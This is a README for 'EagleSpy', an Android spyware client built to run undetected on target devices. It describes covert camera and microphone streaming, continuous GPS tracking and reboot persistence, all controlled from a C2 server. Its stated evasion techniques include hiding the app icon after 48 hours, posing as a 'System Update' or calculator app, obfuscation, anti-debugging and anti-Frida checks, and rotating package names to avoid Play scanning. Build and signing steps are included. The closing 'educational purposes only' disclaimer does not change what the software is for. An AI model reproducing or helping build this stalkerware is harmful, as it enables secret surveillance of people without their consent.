# EagleSpy Android Client - Stealth APK

## 🏗️ Architecture

**NEW:** The Android client now uses **Clean Architecture** with MVVM, Repository pattern, Kotlin Coroutines, and Hilt DI.

📖 **Documentation:**
- [Architecture Overview](ANDROID_ARCHITECTURE.md) - Complete architecture guide
- [Migration Guide](MIGRATION_GUIDE.md) - How to migrate old code
- [Quick Reference](CLEAN_ARCHITECTURE_QUICK_REF.md) - Common patterns & cheat sheets
- [Refactoring Summary](REFACTORING_SUMMARY.md) - What changed and why

### Architecture Layers

```
┌─────────────────────────────────────┐
│  Presentation (ViewModels + UI)    │
├─────────────────────────────────────┤
│  Domain (Use Cases + Models)       │
├─────────────────────────────────────┤
│  Data (Repository + API)            │
└─────────────────────────────────────┘
```

**Key Technologies:**
- Kotlin Coroutines for async operations
- Hilt for Dependency Injection
- StateFlow/SharedFlow for reactive UI
- Retrofit for REST API
- Room for local database (planned)

## 🔒 Stealth Architecture

This Android client implements multiple stealth techniques to remain undetected on target devices.

### Anti-Detection Features

1. **Delayed Icon Hiding**: App icon automatically hides from launcher after 48 hours
2. **Facade UI**: Presents as legitimate "System Update" app during initial setup
3. **Minimal Footprint**: Low-profile notification with generic system names
4. **ProGuard/R8 Obfuscation**: Full code obfuscation in release builds
5. **Certificate Pinning**: Prevents MITM attacks on C2 communication
6. **Integrity Checking**: Detects APK tampering, debugging, and Frida

### Security Modules

- `IntegrityChecker.kt`: APK signature verification, emulator detection, root detection
- `RootDetector.kt`: Multi-layer root detection using various techniques
- `network_security_config.xml`: Certificate pinning for C2 server

## 📡 Communication Architecture

### WebSocket (Primary)
- ActionCable protocol over WebSocket
- Channels: `StreamingChannel`, `LocationChannel`, `CommandChannel`
- Real-time bidirectional communication

### REST API (Fallback)
- WorkManager periodic polling every 15 minutes
- Endpoint: `/api/commands/{device_id}`
- Used when WebSocket connection unavailable

## 🎥 Live Streaming

### WebRTC Implementation
- **Camera**: Front/back camera selection, 640x480@30fps
- **Microphone**: Echo cancellation, noise suppression, auto gain
- **TURN Server**: NAT traversal via Coturn container

### Stream Flow
1. Admin initiates stream request via ActionCable
2. Android receives `start_stream` command
3. Android creates WebRTC peer connection
4. SDP offer/answer exchanged via signaling channel
5. ICE candidates exchanged for NAT traversal
6. P2P media stream established

## 📍 Live Location

### GPS Tracking
- High accuracy mode with battery optimization
- 10-second update interval (configurable)
- Background location via foreground service
- Automatic persistence across device reboots

### Data Transmitted
```json
{
  "latitude": 42.123456,
  "longitude": -71.654321,
  "accuracy": 10.5,
  "altitude": 150.0,
  "speed": 0.0,
  "bearing": 180.0,
  "timestamp": 1700000000000,
  "provider": "fused"
}
```

## 🔧 Build Instructions

### Prerequisites
- Android Studio Hedgehog (2023.1.1) or later
- JDK 17
- Android SDK 34

### Build Release APK
```bash
cd android-client
./gradlew assembleRelease
```

### Sign APK (Production)
```bash
# Generate keystore
keytool -genkey -v -keystore release.keystore -alias eagle -keyalg RSA -keysize 2048 -validity 10000

# Sign APK
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore release.keystore app/build/outputs/apk/release/app-release-unsigned.apk eagle

# Align APK
zipalign -v 4 app-release-unsigned.apk eagle-v1.0.apk
```

## ⚙️ Configuration

### Server URL
Edit `EagleSpyApp.kt`:
```kotlin
var serverUrl = "wss://your-server.com/cable"
```

### TURN Server Credentials
Edit `PeerConnectionClient.kt`:
```kotlin
PeerConnection.IceServer.builder("turn:your-server.com:3478")
    .setUsername("webrtc")
    .setPassword("your-secret")
    .createIceServer()
```

### Certificate Pinning
Edit `network_security_config.xml`:
```xml
<pin digest="SHA-256">YOUR_CERT_HASH_HERE</pin>
```

## 📱 Permissions

### Runtime Permissions (Requested on first launch)
- `ACCESS_FINE_LOCATION`: GPS tracking
- `CAMERA`: Live camera streaming
- `RECORD_AUDIO`: Live microphone streaming

### Manifest Permissions
- `INTERNET`, `ACCESS_NETWORK_STATE`: Network communication
- `RECEIVE_BOOT_COMPLETED`: Persistence after reboot
- `FOREGROUND_SERVICE_*`: Background service types
- `WAKE_LOCK`: Prevent CPU sleep during operations
- `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`: Battery optimization exemption

## 🔋 Battery Optimization

### Features
- **WorkManager Integration**: Battery-aware background sync with constraints
- **Adaptive Intervals**: Dynamic sync intervals based on battery level and charging state
- **Doze Mode Handling**: Maintains operations during Android Doze with maintenance window alarms
- **Feature Gating**: Automatically disables intensive features when battery is low

### Battery-Aware Intervals

| Battery State | Charging | Sync Interval | Location Interval |
|--------------|----------|---------------|-------------------|
| < 15% | No | 60 min | 30 min |
| 15-30% | No | 30 min | 20 min |
| > 30% (WiFi) | No | 15 min | 10 min |
| Any | Yes | 5 min | 5 min |

### Implementation
```kotlin
// Automatic in EagleSpyApp.kt
DataSyncWorker.scheduleAdaptive(context)
DozeOptimization.requestIgnoreBatteryOptimizations(context)

// Use in services
val manager = AdaptiveSyncManager(context)
if (manager.shouldEnableFeature(Feature.CAMERA_CAPTURE)) {
    // Safe to proceed
}
```

See [BATTERY_OPTIMIZATION.md](BATTERY_OPTIMIZATION.md) for full documentation.

## 🛡️ Google Play Compatibility

### Best Practices for Avoiding Detection

1. **Legitimate App Facade**: Use calculator, notes, or utility app as cover
2. **Progressive Disclosure**: Request permissions gradually, not all at once
3. **Minimal Manifest**: Don't declare unused permissions
4. **No Suspicious Strings**: Obfuscate all server URLs and sensitive strings
5. **Regular APK Rotation**: Change package name and signature periodically

### Not Recommended for Play Store
This APK is designed for sideloading only. Google Play's scanning will detect:
- Background location access
- Camera/microphone background usage
- Boot receiver for persistence

## 📁 Project Structure

```
android-client/
├── app/
│   ├── build.gradle
│   ├── proguard-rules.pro
│   └── src/main/
│       ├── AndroidManifest.xml
│       ├── java/com/stealth/eaglespy/
│       │   ├── EagleSpyApp.kt
│       │   ├── MainActivity.kt
│       │   ├── services/
│       │   │   ├── AudioService.kt
│       │   │   ├── BootReceiver.kt
│       │   │   ├── CameraService.kt
│       │   │   ├── CommandService.kt
│       │   │   ├── CommandWorker.kt
│       │   │   └── LocationService.kt
│       │   ├── webrtc/
│       │   │   ├── PeerConnectionClient.kt
│       │   │   └── SignalingClient.kt
│       │   └── security/
│       │       ├── IntegrityChecker.kt
│       │       └── RootDetector.kt
│       └── res/
│           ├── layout/activity_main.xml
│           ├── values/strings.xml
│           ├── values/themes.xml
│           └── xml/network_security_config.xml
├── build.gradle
├── settings.gradle
└── gradle.properties
```

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

This software is provided for security research and educational purposes. 
Unauthorized surveillance is illegal in most jurisdictions.

Using this software to monitor devices without explicit consent may violate:
- Computer Fraud and Abuse Act (USA)
- GDPR (European Union)
- Local wiretapping and privacy laws

The developers assume no liability for misuse of this software.
